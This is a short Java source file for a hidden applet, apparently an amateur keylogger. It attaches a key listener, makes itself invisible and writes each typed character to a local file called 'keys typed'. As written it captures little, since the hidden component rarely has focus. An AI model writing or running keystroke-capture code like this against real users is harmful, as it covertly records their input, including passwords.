package keyTyper;

import java.awt.event.*;
import java.io.*;
import javax.swing.*;

public class KeyTyper extends JApplet
{
	public static void main(String[] args)
	{
		KeyTyper k = new KeyTyper();
	}
	
	public KeyTyper()
	{
		JOptionPane.showConfirmDialog(null, "hello");
		
		KeysTyped k = new KeysTyped();
		this.addKeyListener(k);
		this.setVisible(false);
		while(true)
			try
			{
				Thread.sleep(1);
			} catch (InterruptedException e)
			{
				System.exit(0);
			}
	}
	
	public class KeysTyped implements KeyListener
	{
		private FileWriter fw;
		
		public KeysTyped()
		{
			try
			{
				fw = new FileWriter("keys typed");
			} catch (IOException e)
			{
				System.exit(0);
			}
		}
		
		public void keyPressed(KeyEvent arg0)
		{
		}

		public void keyReleased(KeyEvent arg0)
		{
		}

		public void keyTyped(KeyEvent arg0)
		{
			try
			{
				fw.append(arg0.getKeyChar());
			} catch (IOException e)
			{
				System.exit(0);
			}
		}
	}
}